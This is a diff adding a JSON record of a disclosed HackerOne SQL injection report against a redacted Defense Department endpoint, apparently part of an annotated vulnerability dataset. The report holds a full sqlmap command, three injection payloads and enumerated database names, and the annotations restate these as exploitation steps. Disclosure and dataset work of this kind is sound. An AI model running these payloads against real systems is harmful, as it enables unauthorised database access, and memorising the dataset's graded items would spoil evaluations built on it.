@@ -1,0 +1,46 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "malcolmx ",
+  "title": "SQL injection at [\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588] [HtUS]",
+  "content": "\nHello,\nSummary\nwhile doing test on \u2588\u2588\u2588\u2588\u2588 I\u2019ve found that the endpoint at /olc/set/m101/leasib.php is vulnerable with SQL injection vulnerability\nVulnerable parameters\nscn\nSUBJECT\nCOURSEID\nPOC\nusing sqlmap run command python3 [sqlmap.py](http://sqlmap.py/) --level=5 --risk=3 --tamper=space2comment --random-agent -u [https://\u2588\u2588\u2588\u2588/olc/set/m101/leasib.php](https://\u2588\u2588\u2588\u2588\u2588/olc/set/m101/leasib.php) --data=\"COURSEID=M101&SUBJECT=Entry%20Briefing&StudentName=dPbRKJwr&Submit=Submit%20Confirmation&scn=0\" -p scn\nwe can se that the target is vulnerable\nCode 1010 Bytes\n1Parameter: scn (POST)\n2    Type: boolean-based blind\n3    Title: AND boolean-based blind - WHERE or HAVING clause\n4    Payload: COURSEID=M101&SUBJECT=Entry Briefing&StudentName=dPbRKJwr&Submit=Submit Confirmation&scn=0'||(SELECT 0x5648745a FROM DUAL WHERE 7300=7300 AND 1308=1308)||'\n5\n6    Type: error-based\n7    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)\n8    Payload: COURSEID=M101&SUBJECT=Entry Briefing&StudentName=dPbRKJwr&Submit=Submit Confirmation&scn=0'||(SELECT 0x47636148 FROM DUAL WHERE 1321=1321 AND (SELECT 7303 FROM(SELECT COUNT(*),CONCAT(0x7171706271,(SELECT (ELT(7303=7303,1))),0x71716b6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'\n9\n10    Type: time-based blind\n11    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n12    Payload: COURSEID=M101&SUBJECT=Entry Briefing&StudentName=dPbRKJwr&Submit=Submit Confirmation&scn=0'||(SELECT 0x47774954 FROM DUAL WHERE 5475=5475 AND (SELECT 6347 FROM (SELECT(SLEEP(5)))eoxH))||'\n13---\nadd - -dbs we can see the databases\nCode 182 Bytes\n1available databases [13]:\n2[*] \u2588\u2588\u2588\n3[*] \u2588\u2588\u2588mobile\n4[*] GET\n5[*] information_schema\n6[*] LEAM\n7[*] leat\n8[*] LEV\n9[*] mysql\n10[*] performance_schema\n11[*] SET\n12[*] test\n13[*] testadmin\n14[*] testusers\nImpact\nallows remote attacker to gain access to the database\n\n",
+  "severity": [
+    9.9,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "SQL Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1663203960,
+  "report_url": "https://hackerone.com/reports/1626198",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Identify the vulnerable endpoint at /olc/set/m101/leasib.php on the target system."
+    ],
+    [
+      2,
+      "Use sqlmap with the provided command to exploit the SQL injection vulnerability in the 'scn' parameter: `python3 sqlmap.py --level=5 --risk=3 --tamper=space2comment --random-agent -u https://\u2588\u2588\u2588\u2588/olc/set/m101/leasib.php --data=\"COURSEID=M101&SUBJECT=Entry%20Briefing&StudentName=dPbRKJwr&Submit=Submit%20Confirmation&scn=0\" -p scn`"
+    ],
+    [
+      3,
+      "Optionally, use the `--dbs` flag with sqlmap to enumerate available databases."
+    ]
+  ],
+  "vuln_description": "The endpoint /olc/set/m101/leasib.php is vulnerable to SQL injection via the 'scn' parameter, allowing an attacker to execute arbitrary SQL queries and potentially gain access to the database.",
+  "reason": "The vulnerability is straightforward to discover using automated tools like sqlmap, and does not involve complex interactions or novel logic. The attack primarily involves identifying the vulnerable parameter and using standard SQL injection techniques.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The SQL injection vulnerability involves direct manipulation of database queries through input parameters (scn, SUBJECT, COURSEID) and does not involve authentication or authorization bypass through session or resource ID manipulation. The described methodology focuses on AuthN/AuthZ and IDOR vulnerabilities by testing session and resource ID boundaries, which is not applicable to SQL injection vulnerabilities.",
+    "is_detectable": false
+  }
+}
